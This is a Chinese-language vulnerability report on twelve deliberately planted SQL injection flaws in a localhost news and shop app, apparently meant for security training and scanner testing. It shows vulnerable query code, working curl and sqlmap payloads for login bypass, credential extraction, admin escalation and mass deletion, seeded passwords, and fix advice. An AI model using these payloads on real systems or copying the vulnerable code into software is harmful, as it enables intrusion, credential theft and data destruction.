# SQL注入漏洞分析报告

> **⚠️ 免责声明**: 本文档仅用于安全测试和教育目的。本系统中的漏洞是故意设计的，用于安全研究和漏洞扫描工具验证。

## 概述

本报告记录了在Web新闻门户系统中发现的SQL注入漏洞。这些漏洞存在于系统的正常业务功能中，攻击者可以利用这些漏洞绕过身份验证、提取敏感数据或修改数据库内容。

## 漏洞统计

- **严重程度**: 高危/严重
- **漏洞类型**: SQL注入
- **影响范围**: 12个API端点
- **受影响数据**: 用户凭证、产品信息、订单记录、系统日志

---

## SQL-1: 新闻详情查询中的整数型SQL注入

### 漏洞位置
- **端点**: `GET /api/news/:id`
- **参数**: `id` (路径参数)
- **文件**: `backend/server.js`
- **前端入口**: 新闻列表页面点击标题 → 新闻详情

### 漏洞描述
新闻详情查询功能未对ID参数进行验证和参数化处理，直接将用户输入拼接到SQL查询中。

### 漏洞代码
```javascript
const id = req.params.id;
const sql = `SELECT * FROM news WHERE id = ${id}`;
```

### 测试方法
```bash
# 正常请求
curl http://localhost:3001/api/news/1

# 绕过限制查询所有新闻
curl "http://localhost:3001/api/news/1 OR 1=1--"

# UNION查询用户凭证
curl "http://localhost:3001/api/news/999 UNION SELECT id,username,password,email,role,created_at,NULL,NULL FROM users_db--"
```

### 前端测试
1. 访问 http://localhost:3000/news
2. 点击任意新闻标题
3. 在浏览器地址栏将URL改为 `http://localhost:3000/news/1 OR 1=1--`

### 影响
- 可以查询任意新闻记录
- 可以通过UNION注入查询其他表的敏感数据
- 可以提取数据库结构信息

---

## SQL-2: 新闻分类筛选中的字符串型SQL注入

### 漏洞位置
- **端点**: `GET /api/news/category/:category`
- **参数**: `category` (路径参数)
- **文件**: `backend/server.js`
- **前端入口**: 新闻页面 → 分类筛选下拉框

### 漏洞描述
分类筛选功能未对分类名称进行过滤，攻击者可以通过闭合单引号注入SQL代码。

### 漏洞代码
```javascript
const category = req.params.category;
const sql = `SELECT id, title, author, category, views, publish_date FROM news WHERE category = '${category}'`;
```

### 测试方法
```bash
# 正常请求
curl http://localhost:3001/api/news/category/科技

# 绕过限制
curl "http://localhost:3001/api/news/category/' OR '1'='1"

# 查询用户密码
curl "http://localhost:3001/api/news/category/test' UNION SELECT id,username,password,email,role,NULL FROM users_db--"
```

### 前端测试
1. 访问 http://localhost:3000/news
2. 在分类筛选下拉框中选择任意分类
3. 使用浏览器开发者工具修改请求，将分类参数改为 `' OR '1'='1`

### 影响
- 可以绕过分类限制查看所有新闻
- 可以通过UNION查询敏感数据

---

## SQL-3: 产品详情查询中的Error-based注入

### 漏洞位置
- **端点**: `GET /api/products/:id`
- **参数**: `id` (路径参数)
- **文件**: `backend/server.js`
- **前端入口**: 商城页面 → 点击产品卡片 → 查看详情

### 漏洞描述
产品详情查询不仅存在SQL注入，而且错误信息直接返回给客户端，暴露数据库结构。

### 漏洞代码
```javascript
const id = req.params.id;
const sql = `SELECT * FROM products WHERE id = ${id}`;
// 错误处理不当
res.status(400).json({ "error": err.message });
```

### 测试方法
```bash
# 触发错误查看数据库结构
curl "http://localhost:3001/api/products/1 UNION SELECT * FROM users_db"

# 正确的UNION查询
curl "http://localhost:3001/api/products/999 UNION SELECT id,username,password,email,role,created_at FROM users_db"
```

### 前端测试
1. 访问 http://localhost:3000/shop
2. 点击"产品商城"
3. 点击任意产品的"查看详情"
4. 在产品详情弹窗中，可以看到产品ID，手动构造API请求进行测试

### 影响
- 通过错误信息泄露数据库结构
- 可以提取任意表的数据

---

## SQL-4: 产品搜索中的UNION注入

### 漏洞位置
- **端点**: `GET /api/products/search`
- **参数**: `q`, `category` (查询参数)
- **文件**: `backend/server.js`
- **前端入口**: 商城页面 → 产品商城 → 搜索框

### 漏洞描述
搜索功能使用LIKE查询，但未对关键词进行过滤，可以注入UNION语句。

### 漏洞代码
```javascript
if (keyword) {
  sql += ` AND name LIKE '%${keyword}%'`;
}
```

### 测试方法
```bash
# 查看数据库所有表
curl "http://localhost:3001/api/products/search?q=' UNION SELECT 1,name,sql,4,5,6 FROM sqlite_master WHERE type='table'--"

# 提取用户凭证
curl "http://localhost:3001/api/products/search?q=' UNION SELECT id,username,password,email,role,created_at FROM users_db--"
```

### 前端测试
1. 访问 http://localhost:3000/shop → 产品商城
2. 在搜索框中输入: `' UNION SELECT id,username,password,email FROM users_db--`
3. 点击搜索按钮

### 影响
- 可以查询数据库所有表
- 可以提取任意敏感数据

---

## SQL-5: 产品库存更新中的UPDATE注入

### 漏洞位置
- **端点**: `PUT /api/products/:id/stock`
- **参数**: `id` (路径), `quantity` (body)
- **文件**: `backend/server.js`
- **前端入口**: 商城页面 → 产品详情 → 库存管理

### 漏洞描述
库存更新功能的ID和数量参数都未经过滤，攻击者可以修改任意产品的任意字段。

### 漏洞代码
```javascript
const sql = `UPDATE products SET stock = ${quantity} WHERE id = ${id}`;
```

### 测试方法
```bash
# 修改产品价格为0.01
curl -X PUT http://localhost:3001/api/products/1/stock \
  -H "Content-Type: application/json" \
  -d '{"quantity":"999, price=0.01 WHERE id=1--"}'

# 批量修改所有产品库存
curl -X PUT "http://localhost:3001/api/products/1 OR 1=1--/stock" \
  -H "Content-Type: application/json" \
  -d '{"quantity":0}'
```

### 前端测试
1. 访问 http://localhost:3000/shop → 产品商城
2. 点击任意产品的"查看详情"
3. 在库存管理区域，输入 `999, price=0.01 WHERE id=1--`
4. 点击"更新库存"

### 影响
- 可以修改任意产品的任意字段
- 可以批量修改数据库记录

---

## SQL-6: 用户登录中的Boolean盲注

### 漏洞位置
- **端点**: `POST /api/auth/login`
- **参数**: `username`, `password` (JSON body)
- **文件**: `backend/server.js`
- **前端入口**: 导航栏 → 登录 → 登录表单

### 漏洞描述
登录功能未使用参数化查询，直接拼接用户输入，可以通过Boolean盲注绕过身份验证。

### 漏洞代码
```javascript
const sql = `SELECT * FROM users_db WHERE username = '${username}' AND password = '${password}'`;
```

### 测试方法
```bash
# 绕过密码验证
curl -X POST http://localhost:3001/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\''--","password":"anything"}'

# 获取admin权限
curl -X POST http://localhost:3001/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"'\'' OR role='\''admin'\''--","password":"x"}'

# Boolean盲注提取密码
curl -X POST http://localhost:3001/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\'' AND substr(password,1,1)='\''a'\''--","password":"x"}'
```

### 前端测试
1. 访问 http://localhost:3000/login
2. 在用户名框输入: `admin'--`
3. 密码随意输入
4. 点击登录，将成功绕过验证

### 影响
- 可以绕过身份验证
- 可以以任意用户身份登录
- 可以通过盲注提取密码

---

## SQL-7: 用户注册中的INSERT注入

### 漏洞位置
- **端点**: `POST /api/auth/register`
- **参数**: `username`, `password`, `email` (JSON body)
- **文件**: `backend/server.js`
- **前端入口**: 导航栏 → 登录 → 切换到注册

### 漏洞描述
用户注册功能的INSERT语句直接拼接用户输入，攻击者可以插入恶意数据或提升权限。

### 漏洞代码
```javascript
const sql = `INSERT INTO users_db (username, password, email, role, created_at) 
             VALUES ('${username}', '${password}', '${email || ''}', 'user', '${created_at}')`;
```

### 测试方法
```bash
# 注册时提升为admin权限
curl -X POST http://localhost:3001/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{"username":"hacker","password":"pass","email":"test@test.com'\'', '\''admin'\'')}--"}'
```

### 前端测试
1. 访问 http://localhost:3000/login
2. 切换到"注册"标签
3. 用户名: hacker
4. 密码: pass123
5. 邮箱: `test@test.com', 'admin')}--`
6. 点击注册，将注册为admin权限用户

### 影响
- 可以注册具有admin权限的账户
- 可以绕过字段限制

---

## SQL-8: 用户名检查中的Time-based盲注

### 漏洞位置
- **端点**: `GET /api/auth/check-username/:username`
- **参数**: `username` (路径参数)
- **文件**: `backend/server.js`
- **前端入口**: 注册页面 → 用户名检查工具

### 漏洞描述
用户名可用性检查功能可以被用于执行Time-based盲注攻击。

### 漏洞代码
```javascript
const sql = `SELECT COUNT(*) as count FROM users_db WHERE username = '${username}'`;
```

### 测试方法
```bash
# Boolean盲注提取admin密码第一个字符
curl "http://localhost:3001/api/auth/check-username/admin' AND (SELECT substr(password,1,1) FROM users_db WHERE username='admin')='a'--"

# 检查密码长度
curl "http://localhost:3001/api/auth/check-username/admin' AND (SELECT length(password) FROM users_db WHERE username='admin')>5--"
```

### 前端测试
1. 访问 http://localhost:3000/login
2. 切换到"注册"标签
3. 滚动到底部找到"检查用户名是否可用"
4. 输入: `admin' AND (SELECT substr(password,1,1) FROM users_db WHERE username='admin')='a'--`
5. 点击"检查"，通过响应判断真假

### 影响
- 可以通过响应差异推断数据库内容
- 可以逐字符提取敏感数据

---

## SQL-9: 订单查询中的JOIN注入

### 漏洞位置
- **端点**: `GET /api/orders/user/:userId`
- **参数**: `userId` (路径参数)
- **文件**: `backend/server.js`
- **前端入口**: 商城中心 → 订单管理 → 按用户查询

### 漏洞描述
用户订单查询使用多表JOIN，但用户ID参数未经过滤。

### 漏洞代码
```javascript
const sql = `SELECT o.id, o.quantity, o.total_price, o.status, o.order_date, 
             p.name as product_name, p.price as unit_price
             FROM orders o 
             JOIN products p ON o.product_id = p.id 
             WHERE o.user_id = ${userId}`;
```

### 测试方法
```bash
# 查询所有用户的订单
curl "http://localhost:3001/api/orders/user/1 OR 1=1--"

# UNION查询用户凭证
curl "http://localhost:3001/api/orders/user/999 UNION SELECT id,username,password,email,role,created_at,NULL,NULL FROM users_db--"
```

### 前端测试
1. 访问 http://localhost:3000/shop → 订单管理
2. 在"按用户查询"框中输入: `1 OR 1=1--`
3. 点击"查询用户订单"

### 影响
- 可以查看所有用户的订单
- 可以通过UNION查询其他表

---

## SQL-10: 订单列表中的ORDER BY注入

### 漏洞位置
- **端点**: `GET /api/orders`
- **参数**: `sort`, `order`, `status` (查询参数)
- **文件**: `backend/server.js`
- **前端入口**: 商城中心 → 订单管理 → 排序下拉框

### 漏洞描述
订单列表的排序字段未经验证，可以注入子查询或CASE表达式。

### 漏洞代码
```javascript
sql += ` ORDER BY ${sortBy} ${order}`;
```

### 测试方法
```bash
# 使用子查询排序
curl "http://localhost:3001/api/orders?sort=(SELECT COUNT(*) FROM users_db)&order=DESC"

# 使用CASE表达式进行盲注
curl "http://localhost:3001/api/orders?sort=(SELECT CASE WHEN (SELECT substr(password,1,1) FROM users_db WHERE username='admin')='a' THEN id ELSE total_price END)&order=ASC"
```

### 前端测试
1. 访问 http://localhost:3000/shop → 订单管理
2. 使用浏览器开发者工具查看网络请求
3. 修改sort参数为: `(SELECT COUNT(*) FROM users_db)`
4. 观察结果

### 影响
- 可以通过子查询提取数据
- 可以进行盲注攻击

---

## SQL-11: 订单删除中的DELETE注入

### 漏洞位置
- **端点**: `DELETE /api/orders/:id`
- **参数**: `id` (路径参数)
- **文件**: `backend/server.js`
- **前端入口**: 商城中心 → 订单管理 → 删除按钮

### 漏洞描述
订单删除功能未对ID参数进行验证，可以批量删除记录。

### 漏洞代码
```javascript
const sql = `DELETE FROM orders WHERE id = ${id}`;
```

### 测试方法
```bash
# 删除所有订单
curl -X DELETE "http://localhost:3001/api/orders/1 OR 1=1--"

# 条件删除
curl -X DELETE "http://localhost:3001/api/orders/1 OR status='pending'--"
```

### 前端测试
1. 访问 http://localhost:3000/shop → 订单管理
2. 使用浏览器开发者工具拦截删除请求
3. 修改订单ID为: `1 OR 1=1--`
4. 将删除所有订单

### 影响
- 可以删除任意订单记录
- 可以批量删除数据

---

## SQL-12: 用户搜索中的LIKE注入

### 漏洞位置
- **端点**: `GET /api/users/search`
- **参数**: `q`, `role` (查询参数)
- **文件**: `backend/server.js`
- **前端入口**: 管理后台 → 用户管理 → 搜索框

### 漏洞描述
用户搜索功能使用LIKE查询，但未对搜索关键词进行过滤。

### 漏洞代码
```javascript
if (query) {
  sql += ` AND (username LIKE '%${query}%' OR email LIKE '%${query}%')`;
}
```

### 测试方法
```bash
# 查询所有用户
curl "http://localhost:3001/api/users/search?q=%25' OR '1'='1"

# UNION查询产品表
curl "http://localhost:3001/api/users/search?q=%25' UNION SELECT id,name,description,price FROM products--"
```

### 前端测试
1. 访问 http://localhost:3000/admin → 用户管理
2. 在搜索框中输入: `%' OR '1'='1`
3. 点击搜索，将返回所有用户

### 影响
- 可以绕过搜索限制
- 可以通过UNION查询其他表

---

## 数据库表结构

### users_db (用户表)
```sql
CREATE TABLE users_db (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT UNIQUE NOT NULL,
    password TEXT NOT NULL,
    email TEXT,
    role TEXT DEFAULT 'user',
    created_at TEXT
);
```

**敏感数据**:
- admin / admin123 (管理员账户)
- editor / editor456 (编辑账户)

### products (产品表)
```sql
CREATE TABLE products (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    name TEXT NOT NULL,
    description TEXT,
    price REAL,
    stock INTEGER DEFAULT 0,
    category TEXT
);
```

### orders (订单表)
```sql
CREATE TABLE orders (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    product_id INTEGER,
    quantity INTEGER,
    total_price REAL,
    status TEXT DEFAULT 'pending',
    order_date TEXT
);
```

### news (新闻表)
```sql
CREATE TABLE news (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    title TEXT,
    content TEXT,
    author TEXT,
    publish_date TEXT,
    category TEXT DEFAULT '未分类',
    views INTEGER DEFAULT 0,
    status TEXT DEFAULT 'published'
);
```

---

## 修复建议

### 1. 使用参数化查询
```javascript
// ❌ 错误方式
const sql = `SELECT * FROM users WHERE id = ${id}`;

// ✅ 正确方式
const sql = `SELECT * FROM users WHERE id = ?`;
db.get(sql, [id], callback);
```

### 2. 输入验证
```javascript
// 验证ID是否为整数
if (!/^\d+$/.test(id)) {
  return res.status(400).json({ error: '无效的ID' });
}

// 白名单验证排序字段
const allowedSortFields = ['id', 'name', 'date'];
if (!allowedSortFields.includes(sortBy)) {
  return res.status(400).json({ error: '无效的排序字段' });
}
```

### 3. 使用ORM框架
```javascript
// 使用Sequelize等ORM框架
const user = await User.findByPk(id);
```

### 4. 最小权限原则
- 数据库用户只授予必要的权限
- 避免使用root/admin账户连接数据库

### 5. 错误处理
```javascript
// ❌ 不要暴露详细错误信息
res.status(400).json({ error: err.message });

// ✅ 返回通用错误信息
res.status(400).json({ error: '查询失败，请稍后重试' });
```

---

## 测试工具

### SQLMap
```bash
# 自动扫描
sqlmap -u "http://localhost:3001/api/news/1" --batch

# 提取数据库
sqlmap -u "http://localhost:3001/api/news/1" --batch --dump

# POST参数测试
sqlmap -u "http://localhost:3001/api/auth/login" \
  --data='{"username":"admin","password":"pass"}' \
  --method=POST --content-type="application/json"
```

### 手动测试
```bash
# 测试整数型注入
curl "http://localhost:3001/api/news/1 OR 1=1--"

# 测试字符串型注入
curl "http://localhost:3001/api/news/category/' OR '1'='1"

# 测试UNION注入
curl "http://localhost:3001/api/products/search?q=' UNION SELECT id,username,password,email,role,created_at FROM users_db--"
```

---

## 影响评估

### 严重程度: **严重 (Critical)**

### CVSS评分: **9.8 (严重)**
- 攻击复杂度: 低
- 特权要求: 无
- 用户交互: 无
- 影响范围: 完整性、机密性、可用性

### 业务影响
- **数据泄露**: 可以提取所有用户凭证、订单信息
- **权限提升**: 可以创建管理员账户
- **数据篡改**: 可以修改产品价格、订单状态
- **数据删除**: 可以删除订单记录
- **身份验证绕过**: 可以以任意用户身份登录

---

## 总结

本系统中发现的12个SQL注入漏洞分布在核心业务功能中，包括用户认证、产品管理、订单处理等。这些漏洞的存在使得攻击者可以完全控制数据库，获取所有敏感数据，甚至破坏系统数据完整性。

**所有漏洞都可以通过前端界面被发现和利用**，测试人员可以：
1. 通过正常浏览网站发现功能入口
2. 使用浏览器开发者工具查看和修改HTTP请求
3. 手动构造恶意payload进行测试
4. 使用自动化工具（如SQLMap）进行扫描

**建议立即采取以下措施**:
1. 立即修复所有SQL注入漏洞
2. 实施代码审查流程
3. 部署Web应用防火墙(WAF)
4. 定期进行安全测试
5. 培训开发人员安全编码实践

---

**报告生成日期**: 2025-11-25  
**报告类型**: 安全漏洞分析  
**测试范围**: 全系统API端点  
**测试方法**: 手动测试 + 自动化扫描  
**前端可见性**: ✅ 所有漏洞都有前端入口
